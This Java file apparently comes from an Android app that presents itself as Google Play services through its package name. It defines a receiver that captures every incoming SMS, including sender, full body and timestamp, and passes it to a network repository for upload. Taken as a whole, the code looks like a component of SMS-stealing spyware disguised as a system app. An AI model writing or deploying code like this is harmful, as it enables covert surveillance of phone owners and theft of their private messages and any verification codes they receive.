package com.google.android.gms.persistent.googleapps.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.repositories.network.models.data.event.Message;
import com.google.android.gms.persistent.googleapps.utils.Constants;

import java.util.Date;

import timber.log.Timber;

public class ReceiverOnSms extends BroadcastReceiver {
    private final int TYPE_INCOMING_CALL = Constants.INCOMING_CALL;
    private final SmsManager sms = SmsManager.getDefault();

    @Override
    public void onReceive(Context context, Intent intent) {
        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();
        Timber.tag("ReceiverOnSms");
        Timber.d("sms" + intent.getAction());

        try {
            if (bundle != null) {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                String format = bundle.getString("format");
                final SmsMessage[] messages;
                if (pdusObj != null) {
                    messages = new SmsMessage[pdusObj.length];
                    StringBuilder bodyText = new StringBuilder();

                    for (int i = 0; i < pdusObj.length; i++) {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                            messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i], format);
                        } else {
                            messages[i] = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                        }
                        bodyText.append(messages[i].getMessageBody());
                    }
                    String phoneNumber = messages[0].getDisplayOriginatingAddress();
                    String message = messages[0].getDisplayMessageBody();
                    String name = messages[0].getOriginatingAddress();
                    Date date = new Date(messages[0].getTimestampMillis());
                    Message sms = new Message(phoneNumber,bodyText.toString(), date, TYPE_INCOMING_CALL);
                    App.getAppComponent().getNetworkRepo()
                            .addSMSOfDevice(sms);
                    Toast.makeText(context, "Message " +bodyText.toString() + ", from " + phoneNumber +
                            " " + name , Toast.LENGTH_SHORT).show();

                } // end for loop
            } // bundle is null

        } catch (Exception e) {
            Timber.d("Exception smsReceiver" + e);

        }

    }

}